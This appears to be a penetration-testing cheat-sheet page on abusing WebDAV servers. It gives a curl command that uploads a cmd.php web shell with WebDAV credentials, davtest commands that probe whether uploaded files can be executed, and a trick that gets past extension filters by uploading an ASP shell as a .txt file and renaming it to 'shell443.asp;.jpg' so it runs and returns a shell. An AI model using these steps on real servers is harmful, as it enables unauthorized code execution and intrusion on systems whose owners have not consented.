<title>Webdav Upload</title>
</head><body>Upload can be done a few ways:<br/>
<br/>
Curl:<br/>
WebDav is nice and lets us upload arbitrary files!<br/>
Curl upload<br/>
curl --upload-file cmd.php http://&lt;IP&gt;/webdav_test_inception/cmd.php --user webdav_tester:&lt;password&gt; -vvv<br/>
<br/>
DavTest:<br/>
webdav tool: davtest<br/>
webdav tool: [davscan](https://github.com/Graph-X/davscan)<br/>
Tests for multiple PUTS / EXECS / etc<br/>
DavTest 1.2 (rewardone) adds COPY, MOVE, and CVE 2009 tests<br/>
<br/>
Test if it is possible to upload and execute files with webdav.<br/>
davtest -url http://192.168.1.101 -directory demo_dir -rand aaaa_upfileP0C<br/>
<br/>
<br/>
<br/>
If you managed to gain access but is unable to execute code there is a workaround for that! So if webdav has prohibited the user to upload .asp code, and pl and whatever, we can do this:<br/>
upload a file called shell443.txt, which of course is your .asp shell. And then you rename it to shell443.asp;.jpg. Now you visit the page in the browser and the asp code will run and return your shell.<br/>
